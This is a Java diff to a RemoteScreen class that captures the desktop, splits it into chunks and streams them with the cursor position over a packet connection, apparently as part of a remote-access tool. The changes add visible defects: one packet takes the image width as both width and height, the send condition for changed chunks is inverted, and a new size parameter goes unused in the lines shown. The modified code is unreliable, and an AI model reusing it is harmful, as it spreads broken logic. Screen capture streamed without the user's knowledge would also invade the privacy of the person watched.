@@ -42,13 +42,11 @@ public class RemoteScreen {
 		return sum;
 	}
 	
-	public static void send(boolean once, int quality, int monitor, int rows, int columns, DataOutputStream dos) {
+	public static void send(boolean once, double size, int monitor, int rows, int columns, DataOutputStream dos) {
 		try {	
 			if (prevSums.length != rows * columns) {
 				prevSums = new int[rows * columns];
-			}	
-			float q = Float.parseFloat(quality + "") / 10F;	
-			
+			}				
 			BufferedImage image = null;
 			Rectangle screenBounds = null;
 			
@@ -63,11 +61,10 @@ public class RemoteScreen {
 				screenBounds.y = 0;
 				image = robotForScreen.createScreenCapture(screenBounds);
 			}
-			
-			
+						
 			Point point = MouseInfo.getPointerInfo().getLocation();
 			
-			AbstractOutgoingPacket packet = new Packet17RemoteScreen(screenBounds.width, screenBounds.height, point.x, point.y);
+			AbstractOutgoingPacket packet = new Packet17RemoteScreen(image.getWidth(), image.getWidth(), point.x, point.y);
 												
 	        int chunks = rows * columns;  
 	        int chunkWidth = image.getWidth() / columns; 
@@ -85,7 +82,7 @@ public class RemoteScreen {
 	                gr.drawImage(image, 0, 0, chunkWidth, chunkHeight, chunkWidth * y, chunkHeight * x, chunkWidth * y + chunkWidth, chunkHeight * x + chunkHeight, null);  
 	                gr.dispose();  
 	                
-	                byte[] buffer = ImageUtils.encodeImage(i, q);
+	                byte[] buffer = ImageUtils.encodeImage(i);
 	                
 	                boolean doit = false;
 	                
@@ -99,7 +96,7 @@ public class RemoteScreen {
 	            	
 	            	cou++;
 	               
-	                if (doit) {
+	                if (!doit) {
 	                	Connection.addToSendQueue(packet);
 	                	dos.writeBoolean(false);
 	                	dos.writeInt(x);
@@ -112,7 +109,7 @@ public class RemoteScreen {
 	            }  
 	        }  
 	        
-	        Connection.addToSendQueue(once ? new Packet18OneRemoteScreen(screenBounds.width, screenBounds.height, point.x, point.y) : packet);
+	        Connection.addToSendQueue(once ? new Packet18OneRemoteScreen(image.getWidth(),image.getHeight(), point.x, point.y) : packet);
         	dos.writeBoolean(true);
         	Connection.lock();
 	        
@@ -143,11 +140,17 @@ public class RemoteScreen {
 	}
 
 	public static BufferedImage resize(BufferedImage image, int w, int h) {
-		BufferedImage img = new BufferedImage(w, h, BufferedImage.TYPE_3BYTE_BGR);
+		BufferedImage img = new BufferedImage(w, h, BufferedImage.TYPE_INT_ARGB);
 		Graphics2D gr = img.createGraphics();
 		gr.drawImage(image.getScaledInstance(w, h, BufferedImage.SCALE_SMOOTH), 0, 0, w, h, null);
 		gr.dispose();
 		return img;
+	}
+	
+	public static BufferedImage resize(BufferedImage image, double percent) {
+		int scaledWidth = (int) (image.getWidth() * percent);
+        int scaledHeight = (int) (image.getHeight() * percent);
+        return resize(image, scaledWidth, scaledHeight);
 	}
 
 }
